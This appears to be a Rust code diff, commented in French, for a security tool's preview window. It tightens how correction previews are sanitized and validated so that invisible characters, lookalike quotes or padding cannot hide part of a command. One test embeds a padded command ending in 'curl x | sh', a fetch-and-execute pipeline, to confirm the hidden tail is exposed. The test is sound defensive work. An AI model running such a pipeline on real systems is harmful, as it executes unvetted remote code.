@@ -2,19 +2,24 @@
 //! `{"geste": "voir-correction", "issue": "fait", "apercu": {…}, "accord": "<64 chiffres>"}` avec le code 0, ou
 //! `{"geste": "voir-correction", "issue": "refuse", "raison": "…"}` avec un autre code. Tout le reste (un autre
 //! geste, un autre jeton que celui demandé, une issue qui contredit le code, un champ manquant, nul ou d'un autre
-//! type, un refus sans raison ou avec un accord, une commande vide, des listes trop longues) est illisible : la
-//! feuille le dit, et rien n'est montré comme si c'était sûr.
+//! type, un refus sans raison ou avec un accord, une commande vide, des listes trop longues, une forme que Vanguard
+//! n'écrit jamais) est illisible : la feuille le dit, et rien n'est montré comme si c'était sûr.
 //!
 //! Un champ inconnu, à n'importe quel niveau, rend aussi la réponse illisible : l'accord engage tout ce que Vanguard
 //! a écrit, et un champ ajouté de son côté que la fenêtre ne connaîtrait pas serait engagé sans avoir été montré.
 //!
 //! L'accord, Vanguard le calcule sur les textes tels qu'il les a écrits ; la fenêtre les montre nettoyés, chacun
 //! sur une seule ligne (un saut de ligne dans le message imiterait la suite de la feuille) et sans longue suite
-//! d'espaces (une commande rembourrée cacherait sa fin loin en dessous, dans son cadre). Si le nettoyage a changé
-//! un seul caractère d'un texte montré (un piège, une séquence, un saut de ligne, des espaces resserrées),
-//! `retouche` le dit ; si un texte trop long a été coupé, `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré
-//! n'est plus exactement ce que l'accord engage : le prochain lot ne devra pas offrir d'accepter. Limite connue : une
-//! lettre sosie (un « а » cyrillique dans un chemin) n'est pas un piège pour le nettoyage, elle passe sans retouche.
+//! d'espaces (une commande rembourrée cacherait sa fin loin en dessous, dans son cadre). Le nettoyage ne laisse passer
+//! que ce que les polices de la fenêtre dessinent (`nettoyage::ENCRE`) : un caractère qui ne dessinerait rien devient
+//! « � ». Si le nettoyage a changé un seul caractère d'un texte montré (un piège, une séquence, un signe que les
+//! polices n'ont pas, un saut de ligne, des espaces resserrées), `retouche` le dit ; si un texte trop long a été coupé,
+//! `coupe` le dit à part (la suite n'est pas montrée). Dans les deux cas, ce qui est montré n'est plus exactement ce
+//! que l'accord engage : le prochain lot ne devra pas offrir d'accepter. Chaque texte montré doit aussi avoir au moins
+//! un signe dessiné (`nettoyage::lisible`) : une commande, un message ou une raison faits seulement de blancs,
+//! d'invisibles ou de « � » se montreraient vides. Limites connues : une lettre sosie (un « а » cyrillique dans un
+//! chemin) se dessine, elle passe sans retouche ; une lettre accentuée écrite d'un bloc ou décomposée (lettre puis
+//! accent) se dessine pareil, et deux accents dans un autre ordre aussi.
 
 use serde::Deserialize;
 
@@ -33,6 +38,8 @@ const LIGNE_APERCU_MAX: usize = crate::nettoyage::TEXTE_MAX;
 /// Espaces de suite gardées au plus dans un texte montré : assez pour un alignement, trop peu pour pousser la suite
 /// d'une commande hors de la vue.
 pub const ESPACES_MAX: usize = 3;
+/// Longueur d'une raison de refus montrée, en caractères (la plus longue de Vanguard en a moins de 200).
+const RAISON_MAX: usize = 200;
 
 /// Qui fera la correction, jugé par Vanguard (`machine::Droits`).
 #[derive(Clone, Copy, Debug, PartialEq, Eq)]
@@ -203,13 +210,15 @@ pub fn lire(jeton: Empreinte, code: Option<i32>, sortie: &[u8]) -> Lecture {
                 },
                 |a| Lecture::Lue(Box::new(a)),
             ),
-        // Un refus sans raison lisible laisserait la feuille dire « Pas d'aperçu : » suivi de rien.
+        // Un refus sans raison lisible laisserait la feuille dire « Pas d'aperçu : » suivi de rien. Les raisons de
+        // Vanguard sont cinq phrases fixes (`machine::apercu::Refus`), sans nom venu de l'extérieur : une raison que
+        // le nettoyage doit changer (un piège, un signe que les polices n'ont pas, un saut de ligne, des espaces en
+        // trop) n'est pas la sienne. Plutôt que de la montrer retouchée, la réponse est dite contradictoire.
         ("refuse", Some(c), Some(raison), None, None) if c != 0 => {
-            let raison = crate::nettoyage::nom(&raison, 200);
-            if raison.trim().is_empty() {
-                contradictoire()
+            if crate::nettoyage::lisible(&raison) && resserrer(&crate::nettoyage::ligne_entiere(&raison)) == raison {
+                Lecture::Refusee(crate::nettoyage::couper(&raison, RAISON_MAX))
             } else {
-                Lecture::Refusee(raison)
+                contradictoire()
             }
         }
         _ => contradictoire(),
@@ -229,16 +238,79 @@ fn resserrer(texte: &str) -> String {
         .collect()
 }
 
-/// Une valeur d'avant montrée sur une ligne `geste = «valeur»` : le geste a la forme de Vanguard (`genre|cible`,
-/// le genre en minuscules) et ni lui ni la valeur ne contiennent de guillemets « », qui imiteraient une seconde
-/// valeur sur la même ligne.
+/// Les guillemets et ce qui en a l'air : tous ceux d'Unicode (catégories Pi et Pf, et les guillemets bas U+201A,
+/// U+201E ; tenu par un test) et les chevrons qui ressemblent à « et » (« < », « ≪ », « 《 », « ⟨ »…). Dans une
+/// valeur d'avant, montrée `geste = «valeur»`, ils imiteraient une seconde valeur sur la même ligne.
+fn guillemet(c: char) -> bool {
+    matches!(
+        u32::from(c),
+        0x3C | 0x3E
+            | 0xAB
+            | 0xBB
+            | 0x02C2..=0x02C3
+            | 0x1433
+            | 0x1438
+            | 0x2018..=0x201F
+            | 0x2039..=0x203A
+            | 0x2329..=0x232A
+            | 0x226A..=0x226B
+            | 0x276C..=0x2771
+            | 0x27E8..=0x27EB
+            | 0x2E02..=0x2E05
+            | 0x2E09..=0x2E0A
+            | 0x2E0C..=0x2E0D
+            | 0x2E1C..=0x2E1D
+            | 0x2E20..=0x2E21
+            | 0x3008..=0x300B
+            | 0xFE64..=0xFE65
+            | 0xFF1C
+            | 0xFF1E
+    )
+}
+
+/// Une valeur d'avant montrée sur une ligne `geste = «valeur»` : le geste a l'une des formes qu'une correction de
+/// Vanguard note (`optimiser::annulables::Geste`), et ni lui ni la valeur ne contiennent de guillemet (`guillemet`).
+/// Les formes : `ntp` et `alimentation` seuls ; `droits|` et `fichier|` suivis d'un chemin absolu ; `defense|` suivi
+/// de 16 chiffres hexadécimaux minuscules (`IdNote`) ; `unite|`, `sysctl|`, `module|`, `service|` et `defender|`
+/// suivis d'un nom ASCII sans espace. Une seule barre, une cible jamais vide. Le registre (`registre|…|…|…`) n'y est
+/// pas : seuls les réglages pour jouer le notent, jamais une correction.
 fn avant_lisible(v: &AvantBrut) -> bool {
-    let genre = v.geste.split_once('|').map_or(v.geste.as_str(), |(g, _)| g);
-    let sans_guillemets = |t: &str| !t.contains(['«', '»']);
-    !genre.is_empty()
-        && genre.chars().all(|c| c.is_ascii_lowercase())
-        && sans_guillemets(&v.geste)
-        && v.valeur.as_deref().is_none_or(sans_guillemets)
+    let geste = v.geste.as_str();
+    let forme = match geste.split_once('|') {
+        None => matches!(geste, "ntp" | "alimentation"),
+        Some((_, cible)) if cible.is_empty() || cible.contains('|') => false,
+        Some(("droits" | "fichier", chemin)) => chemin.starts_with('/'),
+        Some(("defense", id)) => id.len() == 16 && id.bytes().all(|o| matches!(o, b'0'..=b'9' | b'a'..=b'f')),
+        Some(("unite" | "sysctl" | "module" | "service" | "defender", nom)) => nom
+            .bytes()
+            .all(|o| o.is_ascii_alphanumeric() || matches!(o, b'-' | b'_' | b'.' | b'@' | b':' | b'/')),
+        Some(_) => false,
+    };
+    forme && !geste.contains(guillemet) && v.valeur.as_deref().is_none_or(|t| !t.contains(guillemet))
+}
+
+/// Les formes que Vanguard écrit (`machine::apercu::apercu_de`), et seulement elles : annulable, sans « pourquoi
+/// pas » et avec ses valeurs d'avant ; sinon, avec un « pourquoi pas » et sans valeur d'avant. Automatique, avec des
+/// commandes ; sinon, jamais avec les droits du compte (rien n'est fait sans commande). Chaque texte montré a un
+/// signe dessiné (`nettoyage::lisible`) : vide, il se montrerait comme rien (un cadre de commande vide).
+fn coherent(a: &ApercuBrut, droits: Droits) -> bool {
+    let lisible = |t: &String| crate::nettoyage::lisible(t);
+    let annulation = if a.annulable {
+        a.pourquoi_pas.is_empty() && !a.avant.is_empty()
+    } else {
+        lisible(&a.pourquoi_pas) && a.avant.is_empty()
+    };
+    let geste = if a.automatique {
+        !a.commandes.is_empty()
+    } else {
+        droits != Droits::Compte
+    };
+    annulation
+        && geste
+        && [&a.version, &a.regle, &a.categorie, &a.message, &a.action]
+            .into_iter()
+            .all(lisible)
+        && a.commandes.iter().all(lisible)
 }
 
 /// L'aperçu, strictement : le jeton demandé, une langue, une gravité et des droits connus, un accord de 64 chiffres,
@@ -257,6 +329,9 @@ fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
     }
     let gravite = gravite(&a.niveau)?;
     let droits = Droits::lire(&a.droits)?;
+    if !coherent(a, droits) {
+        return None;
+    }
     // Nettoyé et resserré d'abord, coupé ensuite : chaque écart compté à part (un piège retiré, une suite non
     // montrée). Chaque texte tient sur une ligne : ceux de Vanguard pour une correction n'ont pas de saut de ligne.
     let (mut retouche, mut coupe) = (false, false);
@@ -276,10 +351,6 @@ fn apercu(jeton: Empreinte, a: &ApercuBrut, accord: &str) -> Option<Apercu> {
     let action = propre(&a.action, max);
     let pourquoi_pas = propre(&a.pourquoi_pas, max);
     let commandes: Vec<String> = a.commandes.iter().map(|c| propre(c, LIGNE_APERCU_MAX)).collect();
-    // Une commande que le nettoyage vide (ou vide d'origine) se montrerait comme un cadre vide : pas une commande.
-    if commandes.iter().any(|c| c.trim().is_empty()) {
-        return None;
-    }
     let avant: Vec<Avant> = a
         .avant
         .iter()
@@ -327,6 +398,19 @@ mod tests {
             "avant": [{"geste": "droits|/home/alice/.ssh", "valeur": "755"}, {"geste": "ntp", "valeur": null}],
             "point_de_restauration": false
         })
+    }
+
+    /// Une correction qui ne s'annule pas, comme Vanguard l'écrit : sa raison, aucune valeur d'avant.
+    fn non_annulable() -> serde_json::Value {
+        let mut a = apercu_json();
+        a["annulable"] = serde_json::json!(false);
+        a["pourquoi_pas"] = serde_json::json!("Vanguard ne sait pas relever l'état d'avant de cette correction");
+        a["avant"] = serde_json::json!([]);
+        a
+    }
+
+    fn lu(a: &serde_json::Value) -> Lecture {
+        lire(jeton(), Some(0), &reponse(a))
     }
 
     fn reponse(apercu: &serde_json::Value) -> Vec<u8> {
@@ -402,7 +486,7 @@ mod tests {
             let mut a = apercu_json();
             a[cle] = match cle {
                 "commandes" => serde_json::json!([trop]),
-                "avant" => serde_json::json!([{"geste": "g", "valeur": trop}]),
+                "avant" => serde_json::json!([{"geste": "ntp", "valeur": trop}]),
                 _ => serde_json::json!(trop),
             };
             let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
@@ -537,7 +621,11 @@ mod tests {
     #[test]
     fn un_texte_a_plusieurs_lignes_tient_sur_une_et_se_dit() {
         for cle in ["message", "action", "pourquoi_pas"] {
-            let mut a = apercu_json();
+            let mut a = if cle == "pourquoi_pas" {
+                non_annulable()
+            } else {
+                apercu_json()
+            };
             a[cle] = serde_json::json!("Retirer la lecture\n\nS'annule : oui\r\nCommandes");
             let Lecture::Lue(lu) = lire(jeton(), Some(0), &reponse(&a)) else {
                 panic!("{cle} pas lu");
@@ -647,6 +735,203 @@ mod tests {
                 );
             }
             assert!(lu.avant.iter().all(|v| !v.geste.contains('\n')));
+        }
+    }
+
+    /// Vérification n° 2 de Fable, P1 : un caractère que les polices ne dessinent pas, absent des anciennes listes de
+    /// pièges (un caractère de format, une marque sans glyphe, un hiéroglyphe de format, un point de code non attribué
+    /// ou privé), ne passe plus tel quel : il se montre « � » et l'aperçu se dit retouché. Une commande, un message, une
+    /// action, une règle ou un « pourquoi pas » faits seulement de ces caractères sont illisibles (ils se montreraient
+    /// vides) ; une espace sur deux ne se cache plus entre eux.
+    #[test]
+    fn un_caractere_qui_ne_dessine_rien_se_voit_et_se_dit() {
+        for rien in [
+            '\u{2065}',
+            '\u{1d173}',
+            '\u{110bd}',
+            '\u{13430}',
+            '\u{378}',
+            '\u{e000}',
+            '\u{f0000}',
+        ] {
+            let mut a = apercu_json();
+            a["commandes"] = serde_json::json!([format!("chmod 600 /home/alice/.ssh/id{rien}_a")]);
+            a["message"] = serde_json::json!(format!("Sa{rien}lon"));
+            let Lecture::Lue(l) = lu(&a) else {
+                panic!("U+{:04X} pas lu", u32::from(rien));
+            };
+            assert_eq!(l.commandes, ["chmod 600 /home/alice/.ssh/id\u{fffd}_a"]);
+            assert_eq!(l.message, "Sa\u{fffd}lon");
+            assert!(l.retouche && !l.coupe);
+            for cle in ["commandes", "message", "action", "regle", "pourquoi_pas"] {
+                let mut a = if cle == "pourquoi_pas" {
+                    non_annulable()
+                } else {
+                    apercu_json()
+                };
+                let vide = format!("{rien} {rien}\u{fe0f}\u{301}");
+                a[cle] = if cle == "commandes" {
+                    serde_json::json!(["chmod 700 ~", vide])
+                } else {
+                    serde_json::json!(vide)
+                };
+                assert!(
+                    matches!(lu(&a), Lecture::Illisible(_)),
+                    "{cle} U+{:04X}",
+                    u32::from(rien)
+                );
+            }
+        }
+        let mut a = apercu_json();
+        a["commandes"] = serde_json::json!([format!("chmod 700 ~{}; curl x | sh", " \u{2065}".repeat(1500))]);
+        let Lecture::Lue(l) = lu(&a) else {
+            panic!("pas lu");
+        };
+        assert_eq!(
+            l.commandes,
+            [format!("chmod 700 ~{}; curl x | sh", " \u{fffd}".repeat(1500))]
+        );
+        assert!(l.retouche && !l.coupe);
+    }
+
+    /// Vérification n° 2 de Fable, P2 : une forme que Vanguard n'écrit jamais est illisible. Annulable avec un
+    /// « pourquoi pas » (jamais montré) ou sans valeur d'avant ; non annulable sans raison ou avec des valeurs d'avant ;
+    /// manuelle avec les droits du compte ; automatique sans commande ; une version, une règle, une catégorie, un
+    /// message ou une action vides ; un geste d'une autre forme que ceux de Vanguard ; un guillemet ou un sosie dans
+    /// un geste ou une valeur. Les formes de Vanguard, elles, se lisent.
+    #[test]
+    fn une_forme_que_vanguard_n_ecrit_pas_est_illisible() {
+        let mut manuelle = non_annulable();
+        manuelle["automatique"] = serde_json::json!(false);
+        manuelle["droits"] = serde_json::json!("admin");
+        manuelle["commandes"] = serde_json::json!([]);
+        let mut bons = vec![apercu_json(), non_annulable(), manuelle];
+        for geste in [
+            "ntp",
+            "alimentation",
+            "droits|/home/alice/.ssh/id_ed25519",
+            "fichier|/etc/ssh/sshd_config.d/00-vanguard.conf",
+            "defense|0123456789abcdef",
+            "unite|cups-browsed",
+            "sysctl|kernel/kptr_restrict",
+            "module|ntsync",
+            "service|SSDPSRV",
+            "defender|np",
+        ] {
+            let mut a = apercu_json();
+            a["avant"] = serde_json::json!([{"geste": geste, "valeur": "0644"}]);
+            bons.push(a);
+        }
+        for a in &bons {
+            assert!(matches!(lu(a), Lecture::Lue(_)), "{a}");
+        }
+        let mut faux = Vec::new();
+        let mut a = apercu_json();
+        a["pourquoi_pas"] = serde_json::json!("caché");
+        faux.push(a);
+        let mut a = apercu_json();
+        a["avant"] = serde_json::json!([]);
+        faux.push(a);
+        let mut a = non_annulable();
+        a["avant"] = serde_json::json!([{"geste": "ntp", "valeur": null}]);
+        faux.push(a);
+        let mut a = non_annulable();
+        a["pourquoi_pas"] = serde_json::json!("");
+        faux.push(a);
+        let mut a = apercu_json();
+        a["automatique"] = serde_json::json!(false);
+        faux.push(a);
+        let mut a = apercu_json();
+        a["commandes"] = serde_json::json!([]);
+        faux.push(a);
+        for cle in ["version", "regle", "categorie", "message", "action"] {
+            for vide in ["", "   ", "\u{200b}"] {
+                let mut a = apercu_json();
+                a[cle] = serde_json::json!(vide);
+                faux.push(a);
+            }
+        }
+        for geste in [
+            "droits|",
+            "droits|/home/alice|/x",
+            "droits|home/alice/.ssh",
+            "ntp|x",
+            "alimentation|",
+            "unite|",
+            "defense|0123",
+            "defense|0123456789ABCDEF",
+            "unite|cups browsed",
+            "unite|cups\u{2010}browsed",
+            "registre|hklm|cle|nom",
+            "inconnu|x",
+            "droits|/home/alice/a \u{27e8}x\u{27e9}",
+            "droits|/home/alice/a <<x>>",
+        ] {
+            let mut a = apercu_json();
+            a["avant"] = serde_json::json!([{"geste": geste, "valeur": "0644"}]);
+            faux.push(a);
+        }
+        for valeur in [
+            "755 \u{226b} = \u{226a}700",
+            "\u{2039}700\u{203a}",
+            "\u{300a}700\u{300b}",
+            "\u{ff1c}700\u{ff1e}",
+            "\u{201c}700\u{201d}",
+        ] {
+            let mut a = apercu_json();
+            a["avant"] = serde_json::json!([{"geste": "ntp", "valeur": valeur}]);
+            faux.push(a);
+        }
+        for a in &faux {
+            assert!(matches!(lu(a), Lecture::Illisible(_)), "{a}");
+        }
+    }
+
+    /// Chaque guillemet d'Unicode (catégories Pi et Pf) est un guillemet pour `guillemet` : un nouveau venu dans une
+    /// version d'Unicode ferait échouer ce test.
+    #[test]
+    fn tous_les_guillemets_sont_connus() {
+        use unicode_general_category::{GeneralCategory as G, get_general_category};
+        let manque: Vec<String> = (0..=u32::from(char::MAX))
+            .filter_map(char::from_u32)
+            .filter(|&c| {
+                matches!(get_general_category(c), G::InitialPunctuation | G::FinalPunctuation) && !guillemet(c)
+            })
+            .map(|c| format!("U+{:04X}", u32::from(c)))
+            .collect();
+        assert!(manque.is_empty(), "{manque:?}");
+        assert!(!guillemet('"') && !guillemet('\'') && !guillemet('a'));
+    }
+
+    /// Vérification n° 2 de Fable, P5 : la raison d'un refus passe par le même nettoyage que les autres textes (une
+    /// ligne, les espaces resserrées, ce qui ne se dessine pas en « � ») ; les raisons de Vanguard sont des phrases
+    /// fixes que ce nettoyage ne change pas, donc une raison qu'il changerait (rembourrée d'espaces, sur deux lignes,
+    /// avec un invisible) rend la réponse contradictoire. Trop longue, elle est coupée.
+    #[test]
+    fn une_raison_de_refus_retouchee_n_est_pas_celle_de_vanguard() {
+        let refus = |raison: &str| {
+            serde_json::json!({"geste": "voir-correction", "issue": "refuse", "raison": raison}).to_string()
+        };
+        let vraie = "ce problème a disparu ou a déjà été corrigé : refaites le bilan";
+        assert_eq!(
+            lire(jeton(), Some(1), refus(vraie).as_bytes()),
+            Lecture::Refusee(vraie.into())
+        );
+        let Lecture::Refusee(longue) = lire(jeton(), Some(1), refus(&"x".repeat(300)).as_bytes()) else {
+            panic!("longue pas lue");
+        };
+        assert!(longue.chars().count() == RAISON_MAX && longue.ends_with('…'));
+        for faux in [
+            format!("ce problème a disparu{}: refaites le bilan", " ".repeat(150)),
+            "ce problème a disparu\nrefaites le bilan".to_string(),
+            "ce problème a dis\u{2065}paru".to_string(),
+            "ce problème a disparu ".to_string(),
+            "\u{2065} \u{e000}".to_string(),
+        ] {
+            assert!(
+                matches!(lire(jeton(), Some(1), refus(&faux).as_bytes()), Lecture::Illisible(_)),
+                "{faux:?}"
+            );
         }
     }
 }
